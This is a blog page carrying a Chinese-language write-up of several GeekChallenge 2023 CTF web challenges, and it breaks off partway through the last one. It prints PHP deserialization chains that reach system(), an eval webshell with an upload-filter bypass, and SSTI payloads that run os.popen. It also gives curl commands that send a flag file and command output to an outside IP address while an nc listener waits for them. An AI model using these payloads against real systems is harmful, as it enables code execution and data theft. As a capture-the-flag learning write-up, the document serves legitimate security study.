<!--
	作者：Sariay
	时间：2018-08-26
	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
-->
<!DOCTYPE html>
<html class="html-loading">
		

<head>
	<meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <title>
    
      GeekChallenge 2023 WEB赛题目WP | Infernity&#39;s Blog
    
  </title>
  <meta name="author" content="Infernity">
  <meta name="keywords" content="" />
  <meta name="description" content="blog" />
	<!-- favicon -->
  <link rel="shortcut icon" href="/img/I.png">

  <!-- css -->
  
<link rel="stylesheet" href="/css/Annie.css">

  
  <!-- jquery -->
	
<script src="/plugin/jquery/jquery.min.js"></script>


<script>
    const CONFIG_BGIMAGE = {
      mode: 'random_you',
      normalSrc: '/img/header-bg.jpg',
      randomYouMax: 59,
      randomYouSrc: '/img/background/',
	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
	  preloaderEnable: true
    }
	
    const CONFIG_LEACLOUD_COUNT = {
      enable: true,
	  appId: 'AU8',
	  appKey: '4cU',
	  serverURLs: 'http' || ' '
    }
  </script>
<meta name="generator" content="Hexo 6.3.0"></head>
	<body>
		<!-- Preloader -->

	<div id="preloader">
		<div class="pre-container">
			
				<div class="spinner">
					<div class="double-bounce1"></div>
					<div class="double-bounce2"></div>
				</div>
						
		</div>
	</div>


<!-- header -->
<header class="fixbackground bg-pan-br">
	<div class="mask">
		<!-- motto -->
		<div class="h-body">	
			
				<div class="motto text-shadow-pop-left">
					<p class="content" id="motto-content">获取中...</p>
					<p>-<p>
					<p class="author" id="motto-author">Just a minute...</p>
				</div>
			
		</div>
		
		<!-- others: such as time... -->			
		<div class="h-footer">
			<a href="javascript:;" id="read-more" class="scroll-down">
				<span class="icon-anchor1 animation-scroll-down"></span>
			</a>
		</div>
	</div>
</header>

<div id="navigation-hide">
	<!-- Progress bar -->
	<div id="progress-bar"></div>

	<!-- Progress percent -->
	<div id="progress-percentage"><span>0.0%</span></div>

	<div class="toc-switch"><span class="switch-button">目录</span></div>

	<!-- Page title -->
	<p>
		
			「GeekChallenge 2023 WEB赛题目WP」
		
	</p>

	
	
		<span id="star-button" rel="unlike">
			<i class="icon-heart"></i>
		</span>
	

	<!-- Nav trigger for navigation-H-->
	<a class="nav-trigger"><span></span></a>
</div>

<!-- Navigation in div(id="navigation-H") -->
<nav class="nav-container" id="cd-nav">
	<div class="nav-header">
		<span class="logo"> 
			<img src="/img/logo.png">
		</span>
		<a href="javascript:;" class="nav-close"></a>
	</div>
	
	<div class="nav-body">
		<ul id="global-nav">
	
		<li class="menu-home">
			<a href="/" class="menu-item-home" target="_blank">主页</a>
		</li>
		
	
		<li class="menu-archive">
			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
		</li>
		
	
		<li class="menu-categories">
			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
		</li>
		
	
		<li class="menu-tags">
			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
		</li>
		
	
		<li class="menu-Friends!">
			<a href="/friends" class="menu-item-Friends!" target="_blank">Friends!</a>
		</li>
		
	
		<li class="menu-gallery">
			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
		</li>
		
	

	
</ul>
	</div>
	
	<div class="nav-footer">
		<ul id="global-social">
	
		<li>
			<a href="http://github.com/" target="_blank">
				<span class="icon-one"><span class="path1"></span><span class="path2"></span></span>
			</a>
		</li>
	
		<li>
			<a href="/img/qq.png" target="_blank">
				<span class="icon-qq"></span>
			</a>
		</li>
	
		<li>
			<a href="https://github.com/CyberPunk-Infernity" target="_blank">
				<span class="icon-github"></span>
			</a>
		</li>
	
		<li>
			<a href="/img/weixin.jpg" target="_blank">
				<span class="icon-weixin"></span>
			</a>
		</li>
	
		<li>
			<a href="https://blog.csdn.net/qq_39591427?spm=1000.2115.3001.5343" target="_blank">
				<span class="icon-csdn"></span>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<span class="icon-instagram"></span>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<span class="icon-twitter"></span>
			</a>
		</li>
	
		<li>
			<a href="/atom.xml" target="_blank">
				<span class="icon-rss"></span>
			</a>
		</li>
			
</ul>

	</div>
</nav>
			
		<!--main-->
		<main>
			<!--
	时间：2018-11-17
	描述：
		插件名称：katelog.min.js
		插件作者：KELEN
		插件来源: https://github.com/KELEN/katelog
-->

	
		<div class="layout-toc">
			<div id="layout-toc">
				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
			</div>
		</div>

		
<script src="/plugin/toc/katelog.min.js"></script>


		
	 

<div class="layout-post">
	<div id="layout-post">
		<div class="article-title">
			
	<a href="/2023/11/28/GeekChallenge%202023%20WEB%E8%B5%9B%E9%A2%98WP/" itemprop="url">
		GeekChallenge 2023 WEB赛题目WP
	</a>

		</div>

		<div class="article-meta">
			<span>
				<i class="icon-calendar1"></i>
				
				




	更新于

	<a href="/2023/11/28/GeekChallenge%202023%20WEB%E8%B5%9B%E9%A2%98WP/" itemprop="url">
		<time datetime="2023-11-28T06:01:24.000Z" itemprop="dateUpdated">
	  		2024-06-18
	  </time>
	</a> 



			</span>
			<span>
				
	<i class="icon-price-tags"></i>
	
		<a href="/tags/WPs/" class=" ">
			WPs
		</a>
	
		
			</span>
			
			

	
    <span class="leancloud_visitors" id="/2023/11/28/GeekChallenge%202023%20WEB%E8%B5%9B%E9%A2%98WP/_visitors" data-url="/2023/11/28/GeekChallenge%202023%20WEB%E8%B5%9B%E9%A2%98WP/" data-title="GeekChallenge 2023 WEB赛题目WP">
       	<i class="icon-eye"></i>
       	热度
        
            <i class="leancloud_visitors_count" id="leancloud_visitors_count">1</i>
                   
    </span>
    



	
    <span class="leancloud_likes" id="/2023/11/28/GeekChallenge%202023%20WEB%E8%B5%9B%E9%A2%98WP/_likes" data-url="/2023/11/28/GeekChallenge%202023%20WEB%E8%B5%9B%E9%A2%98WP/" data-title="GeekChallenge 2023 WEB赛题目WP" rel="unlike">
        <i class="icon-heart"></i>
        喜欢
        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
    </span>
	

		</div>

		<div class="article-content" id="article-content">
			<p>by:Infernity</p>
<h2 id="EzHttp"><a href="#EzHttp" class="headerlink" title="EzHttp"></a>EzHttp</h2><p>请post传参username和password进行登录</p>
<p>第一步先找username和password，查看源码发现“**密码记在了不想让爬虫获取的地方!**”</p>
<p>查阅资料，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">几乎所有的搜索引擎爬虫，都会遵守robots协议</span><br></pre></td></tr></table></figure>

<p>那么打开robots.txt，再进入&#x2F;o2takuXX’s_username_and_password.txt</p>
<p>发现username和password</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin</span><br><span class="line">password:@dm1N123456r00t#</span><br></pre></td></tr></table></figure>

<p>返回index.php，继续传参后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">必须来源自sycsec.com</span><br></pre></td></tr></table></figure>

<p>那么修改Referer为sycsec.com</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请使用Syclover浏览器</span><br></pre></td></tr></table></figure>

<p>那么修改User-Agent为Syclover</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请从localhost访问</span><br></pre></td></tr></table></figure>

<p>那么添加一句x-forwarded-for:127.0.0.1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请使用Syc.vip代理</span><br></pre></td></tr></table></figure>

<p>那么添加一句via:Syc.vip</p>
<p>然后代码审计php，$_SERVER是获取请求头里的参数值，后面是HTTP_O2TAKUXX，我们去掉HTTP_在请求头里加一句：O2TAKUXX：GiveMeFlag</p>
<p>爆出flag：SYC{HttP_1s_E@sY}</p>
<h2 id="unsign"><a href="#unsign" class="headerlink" title="unsign"></a>unsign</h2><p>反序列化，好诶！</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eva1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$interesting</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;get!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$eva1</span>=<span class="variable language_">$this</span>-&gt;eva1;</span><br><span class="line">        <span class="variable">$eva1</span>(<span class="variable language_">$this</span>-&gt;interesting);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看末尾，web这个类里有明显的提示eva1长得像eval勒，肯定就是这里命令执行输出flag，我们写eva1&#x3D;’system’，interesting&#x3D;’ls &#x2F;‘</p>
<p>那么我们肯定要先进入这个方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__get()    			//用于从不可访问的属性读取数据</span><br></pre></td></tr></table></figure>

<p>那肯定就要往上看了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lover</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;invoke!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;yxx-&gt;QW;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>lover这个类里面最后return $this-&gt;yxx-&gt;QW;我们只需要将yyx和QW随便设置一个值，反正随便设置的肯定没法访问，所以就能触发get()方法，我这里设置yxx&#x3D;’a’，QW&#x3D;’a’</p>
<p>要这样用，肯定就要触发invoke()方法，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__invoke()   		//当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>

<p>就要看最上面的一个类：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cuit</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;action!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$function</span>=<span class="variable language_">$this</span>-&gt;cuit;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里$function&#x3D;$this-&gt;cuit;把cuit的值赋给function，然后return $function();这里就触发invoke()方法，</p>
<p>这里也不用管cuit到底是什么，反正都会将对象调用为函数而出发invoke()我这里设置cuit&#x3D;’a’</p>
<p>而destruct()方法是在这里会自动触发，所以不用管。</p>
<p>最终代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cuit</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lover</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yxx</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eva1</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$interesting</span>=<span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">syc</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;cuit=<span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;cuit-&gt;yxx=<span class="keyword">new</span> <span class="title function_ invoke__">web</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>把输出传入题中，发现返回了ls &#x2F;的执行情况，那么这道题就解决了。</p>
<p>SYC{wqle9ssXk9cB7fhYly}</p>
<h4 id="n00b-Upload"><a href="#n00b-Upload" class="headerlink" title="n00b_Upload"></a>n00b_Upload</h4><p>文件上传，先传一个jpg文件看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;123&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>说我后缀过了，头部过了，你上传的内容一看就是木马</p>
<p>说明有文件内容检查，经过尝试，发现会过滤&lt;?php，那么使用php短标签试试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=(表达式)?&gt;          等价于 &lt;?php echo (表达式)?&gt;  #不需要开启参数设置</span><br></pre></td></tr></table></figure>

<p>传入123.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=(`ls`)?&gt;</span><br></pre></td></tr></table></figure>

<p>发现上传成功，进入文件目录，发现回显了本目录下的所有东西，那么这道题解决了。</p>
<p>（这道题还是动态flag&#x3D;-&#x3D;）</p>
<p>SYC{hUR1ep7TkikaVYaoiM}</p>
<h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p>php代码审计</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#x27;/^Welcome to GEEK 2023!$/i&#x27;, $_GET[&#x27;syc&#x27;])</span><br></pre></td></tr></table></figure>

<p>这一句^和$的作用是从头到尾匹配，说明我们不能在前后增减字符，只能是他给的这个字符串，但是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&#x27;syc&#x27;] !== &#x27;Welcome to GEEK 2023!&#x27;</span><br></pre></td></tr></table></figure>

<p>后面又让我们传入的syc不等于他给的字符串怎么办勒，关键就是第一句prge_match的修饰符&#x2F;i</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ regexp / i                      不区分大小写的匹配 </span><br></pre></td></tr></table></figure>

<p>那么，我们只需要在原字符串上随便修改一个大小写就成功进入if，传入syc&#x3D;Welcome to GEEk 2023!</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intval($_GET[&#x27;lover&#x27;]) &lt; 2023 &amp;&amp; intval($_GET[&#x27;lover&#x27;] + 1) &gt; 2024</span><br></pre></td></tr></table></figure>

<p>这一句intval函数是取得变量的整数部分，如果是字符串就为0,如果是数字和字符串，取得第一个遇到的数字的值。这里让lover&lt;2023 加1后又大于2024，怎么办嘞，我们利用intval函数和php传参时的性质：</p>
<p>我们知道php传入的参数都是字符串，而且php中数字有特殊的表示方式，比如科学技术法。</p>
<p>我们传入lover&#x3D;2e4，传入2e4后因为会被识别成字符串，intval函数就会取第一个数字的值，即为2,这里就小于了2023，后面’2e4’+1这里进行了运算，php就会认为2e4不是字符串而是个数字，即是20000+1&#x3D;20001&gt;2024</p>
<p>这里就进入了if。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$array1 = (string)$_POST[&#x27;qw&#x27;];</span><br><span class="line">$array2 = (string)$_POST[&#x27;yxx&#x27;];</span><br><span class="line">if (sha1($array1) === sha1($array2))</span><br></pre></td></tr></table></figure>

<p>这里强制把我们传入的qw和yxx转成了字符串，那么平时强比较绕过的方法就失效了，我们必须找sha1确实相等的两个字符串。经过查找sha1碰撞：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">qw=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br><span class="line">&amp;</span><br><span class="line">yxx=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>

<p>POST传参，成功绕过。</p>
<p>最后一步是非法变量名，在php中[ . 空格 +都会被转为_而如果前面有一个[，就只有这个中括号会被转化为下划线，后面的这些字符就不会被转化，所以我们传入SYC[GEEK.2023&#x3D;Happy to see you!</p>
<p>成功拿到flag</p>
<p>SYC{RF8MgCYJC9diWlfaKq}</p>
<h2 id="ctf-curl"><a href="#ctf-curl" class="headerlink" title="ctf_curl"></a>ctf_curl</h2><p>这里考察curl的用法</p>
<p><a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">https://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a></p>
<p>告诉了我们flag的位置和名字，我们使用-d参数，将flag发送到我们的服务器上，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?addr=-d @/tmp/Syclover 47.108.89.135</span><br></pre></td></tr></table></figure>

<p>由于这里过滤了:所以我们不能添加端口，只能使用默认的80端口。</p>
<p>打开ssh链接服务器，监听80端口，在输入参数发包，就能在我们的服务器上接受到flag</p>
<h2 id="klf-ssti"><a href="#klf-ssti" class="headerlink" title="klf_ssti"></a>klf_ssti</h2><p>index.php啥也没有，查看源码，去看看&#x2F;hack</p>
<p>再看源码，提示我们传入klf参数，根据题目名字我们知道这里应该是ssti注入。</p>
<p>经过一系列尝试，发现无论输入什么都会是一个小黄脸嘲讽我们，那可能是ssit无回显。</p>
<p>找到万能payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;aaa&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>把aaa换成我们的命令，本来想尝试反弹shell，发现目标机好像不支持反弹shell，那么虽然无回显，我们可以通过将回显写入一个文件，再通过curl命令读取文件发送到我们的服务器上，完成伪反弹shell。</p>
<p>首先</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /app&gt;1.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们读取1.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;curl -d @1.txt 47.108.89.135:2333&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>于此同时，我们在ssh上开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvvp 2333</span><br></pre></td></tr></table></figure>

<p>收到了回显，发现flag叫fl4gfl4gfl4g，那么</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> &#123;&#125;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /app/fl4gfl4gfl4g</span><br><span class="line">&gt;1.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>重复上述步骤，拿到flag</p>
<p>SYC{wvDsEswyYrqSKJYJme}</p>
<h2 id="ez-remove"><a href="#ez-remove" class="headerlink" title="ez_remove"></a>ez_remove</h2><p>短小精焊的反序列化，题目：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;lover);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/lover/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;快来玩快来玩~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><strong>考点一：fast_destruct</strong></p>
<p>当一个PHP线程结束时，当前占用的所有内存空间都会被销毁，当前程序中的所有对象同样被销毁。</p>
<p>关键的eval函数被放在destruct方法里，正常析构函数只有在对象被垃圾收集器收集前（即对象从内存中删除之前）才会被自动调用。而这里程序多给了一句：<strong>throw new Error()</strong></p>
<p>这就导致__destruct方法无法被正常触发，所以我们得想办法提前触发__destruct</p>
<p>首先我们需要生成一个数组：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">syc</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">改为</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="keyword">new</span> <span class="title function_ invoke__">syc</span>(),<span class="string">&#x27;awawaw&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>然后我们需要把生产后的序列化代码的第二个i后面的数字改成0</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">3</span>:<span class="string">&quot;syc&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;lover&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;i:<span class="number">1</span>;s:<span class="number">6</span>:<span class="string">&quot;awawaw&quot;</span>;&#125; </span><br><span class="line">改成</span><br><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">3</span>:<span class="string">&quot;syc&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;lover&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;i:<span class="number">0</span>;s:<span class="number">6</span>:<span class="string">&quot;awawaw&quot;</span>;&#125; </span><br></pre></td></tr></table></figure>

<p>这样改后，php反序列化完第一个数组，也就是payload的时候，计数器-1就会提前触发__destruct</p>
<p><strong>考点二：绕过变量名过滤</strong></p>
